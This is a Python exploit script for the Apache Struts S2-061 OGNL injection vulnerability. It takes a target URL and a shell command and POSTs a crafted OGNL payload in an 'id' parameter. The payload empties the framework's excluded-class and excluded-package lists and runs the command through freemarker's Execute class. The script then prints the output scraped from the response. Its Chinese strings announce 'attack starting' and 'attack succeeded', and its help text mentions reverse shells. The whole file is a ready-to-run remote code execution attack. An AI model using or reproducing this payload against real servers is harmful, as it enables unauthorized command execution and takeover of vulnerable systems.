import requests
import argparse
from bs4 import BeautifulSoup
#s2-061 is exp

if __name__ == '__main__':
    parse=argparse.ArgumentParser("反弹shell不会返回信息")
    parse.add_argument("url",type=str)
    parse.add_argument("-c","--cmd",type=str)

    arguments=parse.parse_args()
    url=arguments.url
    cmd=arguments.cmd

    payload="%{{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"{0}\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}}".format(cmd)
    file={
        "id":payload
    }
    req=requests.session()
    #req.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    print("开始攻击")
    resp=req.post(url,file)
    if resp.status_code==200:
        soup=BeautifulSoup(resp.content, 'html.parser',from_encoding='utf-8')
        print("攻击成功,返回结果："+soup.a.attrs["id"])


